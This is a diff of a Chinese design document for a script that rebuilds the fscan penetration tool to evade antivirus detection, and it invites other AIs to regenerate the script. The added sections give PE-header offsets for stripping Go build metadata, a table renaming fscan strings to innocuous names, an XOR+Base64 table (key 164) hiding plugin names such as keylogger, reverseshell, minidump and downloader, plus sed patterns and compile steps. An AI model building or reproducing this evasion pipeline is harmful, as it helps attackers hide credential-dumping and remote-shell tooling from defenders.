@@ -503,12 +503,136 @@ A 被 E 覆盖（E = A + strip），F 与 A 仅在源码字符串层面差异。
 
 ---
 
-## 一键构建脚本
+## 一键构建脚本（其他 AI 可据此自行生成）
 
-所有方案的源码替换 + 编译 + PE 清洗已整合为单脚本。预计算 XOR 插件名、预扫描 embed 路径、并行编译。
+### 脚本架构（6 步流水线）
+
+```
+check_env → scan_embed_paths → apply_replacements → [obfuscate_plugins] → build_pecleaner → compile_and_clean
+                                                                           ↑ 仅 F              ↑ 并行 A+F
+```
+
+### 核心组件 1：Go 原生 PE 清洗器
+
+文件 `pe_cleaner.go`，加 `//go:build ignore` 标签。`GO111MODULE=off` 在独立 temp dir 编译，避免与主模块冲突。
+
+PE 头解析链及关键偏移：
+
+```
+data[0x3C:0x40]  → e_lfanew (DWORD LE)           // DOS 头
+e_lfanew+4        → "PE\x00\x00" 签名
+coffOff = e_lfanew+4
+  +2              → NumberOfSections (WORD)
+  +4              → TimeDateStamp (DWORD) → 清零
+  +16             → SizeOfOptionalHeader (WORD)
+optOff = coffOff + 20
+  +64             → CheckSum (DWORD) → 清零       // PE32/PE32+ 同偏移
+secHdrOff = optOff + SizeOfOptionalHeader
+  每 40 字节一个 Section Header:
+    +0  (8B)      → Name[8]
+    +16 (4B)      → SizeOfRawData
+    +20 (4B)      → PointerToRawData
+```
+
+节区操作映射：
+
+| 原节区名 | 清零范围 | 重命名为 |
+|---------|---------|---------|
+| `.gosymtab` | 前 16 字节 | `.text` |
+| `.gopclntab` | 前 32 字节 | `.rdata` |
+| `.buildinfo` | 全部清零 | `.data` |
+| `.note.go.buildid` | 全部清零 | `.reloc` |
+
+额外：字节扫描整个 PE，找到 `go buildid ` 标记全部 `\x00` 覆盖。
+
+### 核心组件 2：`//go:embed` 路径扫描
 
 ```bash
-bash Desktop/build_fscan_evasion.sh        # 全部方案
+grep -rn "//go:embed" "$dir" --include="*.go" | while read line; do
+    pattern=$(echo "$line" | grep -oP '//go:embed\s+\K\S+')
+    # 展开 glob，收集所有嵌入文件路径
+done
+```
+
+关键嵌入点：`webscan/web_scan.go` → `pocs/`（YAML）、`web/server.go` → `dist/*`（JS）
+
+### 核心组件 3：Scheme F 字符串替换表
+
+| 文件 | 原文 | 替换为 |
+|------|------|--------|
+| `common/flag.go` | `Fscan %s (%s %s)` | `SysChk %s (%s %s)` |
+| `common/flag.go` | `Fscan %s` | `SysChk %s` |
+| `common/logger.go` | `fscan_debug.log` | `debug_trace.log` |
+| `plugins/local/forwardshell.go` | `FScan Forward Shell` | `Remote Shell` |
+| `plugins/local/cleaner.go` | `fscan*.exe` 等 7 处 | `syschk*` 对应替换 |
+| `web/api/result.go` | `fscan_results.json/csv` | `scan_export.json/csv` |
+| `webscan/lib/poc_adapter.go` | `"fscan"` | `"native"` |
+| `core/web_scanner.go` | `fscan-web-detector/2.1` | `NetScanner/2.1` |
+| `plugins/services/smtp.go` | `fscan.test` | `localhost.local` |
+
+### 核心组件 4：XOR+Base64 插件名混淆表（`key=164`）
+
+`common/obfuscate.go` 内嵌 `func Decode(encoded string, key byte) string`，XOR 解码 + Base64 解码。
+
+sed 替换模式（5 种注册函数均需覆盖）：
+```bash
+s|NewBasePlugin("$name")|NewBasePlugin(common.Decode("$encoded", 164))|g
+s|RegisterPluginWithPorts("$name",|RegisterPluginWithPorts(common.Decode("$encoded", 164),|g
+s|RegisterLocalPlugin("$name",|RegisterLocalPlugin(common.Decode("$encoded", 164),|g
+s|RegisterWebPlugin("$name",|RegisterWebPlugin(common.Decode("$encoded", 164),|g
+s|RegisterPlugin("$name",|RegisterPlugin(common.Decode("$encoded", 164),|g
+```
+
+25 个 service 插件映射：
+
+| 原名 | 编码值 | 原名 | 编码值 |
+|------|--------|------|--------|
+| ssh | `19fM` | smb | `18nG` |
+| mysql | `yd3X1cg=` | mssql | `ydfX1cg=` |
+| redis | `1sHAzdc=` | ftp | `wtDU` |
+| rdp | `1sDU` | ms17010 | `ydeVk5SVlA==` |
+| netbios | `ysHQxs3L1w==` | vnc | `0srH` |
+| telnet | `0MHIysHQ` | postgresql | `1MvX0MPWwdfVyA==` |
+| oracle | `y9bFx8jB` | mongodb | `ycvKw8vAxg==` |
+| memcached | `ycHJx8XHzMHA` | elasticsearch | `wcjF19DNx9fBxdbHzA==` |
+| ldap | `yMDF1A==` | kafka | `z8XCz8U=` |
+| rabbitmq | `1sXGxs3QydU=` | cassandra | `x8XX18XKwNbF` |
+| rsync | `1tfdysc=` | smtp | `18nQ1A==` |
+| neo4j | `ysHLkM4=` | activemq | `xcfQzdLBydU=` |
+| findnet | `ws3KwMrB0A==` |
+
+21 个 local 插件映射：
+
+| 原名 | 编码值 | 原名 | 编码值 |
+|------|--------|------|--------|
+| cleaner | `x8jBxcrB1g==` | forwardshell | `wsvW08XWwNfMwcjI` |
+| crontask | `x9bLytDF188=` | envinfo | `wcrSzcrCyw==` |
+| dcinfo | `wMfNysLL` | fileinfo | `ws3Iwc3Kwss=` |
+| ldpreload | `yMDU1sHIy8XA` | downloader | `wMvTysjLxcDB1g==` |
+| keylogger | `z8HdyMvDw8HW` | reverseshell | `1sHSwdbXwdfMwcjI` |
+| avdetect | `xdLAwdDBx9A=` | systemdservice | `193X0MHJwNfB1tLNx8E=` |
+| minidump | `yc3KzcDRydQ=` | shellenv | `18zByMjBytI=` |
+| socks5proxy | `18vHz9eR1NbL3N0=` | systeminfo | `193X0MHJzcrCyw==` |
+| winschtask | `083K18fM0MXXzw==` | winregistry | `083K1sHDzdfQ1t0=` |
+| winservice | `083K18HW0s3HwQ==` | winstartup | `083K19DF1tDR1A==` |
+| winwmi | `083K08nN` | | |
+
+2 个 web 插件：`webtitle`→`08HG0M3QyME=`、`webpoc`→`08HG1MvH`
+
+### 核心组件 5：并行编译
+
+```bash
+build_A & pid_a=$!
+build_F & pid_f=$!
+wait $pid_a; wait $pid_f
+```
+
+每个方案独立：复制源码目录 → 替换 → [混淆] → 编译 pe_cleaner → go build → PE 清洗 → 验证。
+
+### 用法
+
+```bash
+bash Desktop/build_fscan_evasion.sh        # 全部方案（并行）
 bash Desktop/build_fscan_evasion.sh A      # 仅方案 A
 bash Desktop/build_fscan_evasion.sh F      # 仅方案 F
 ```
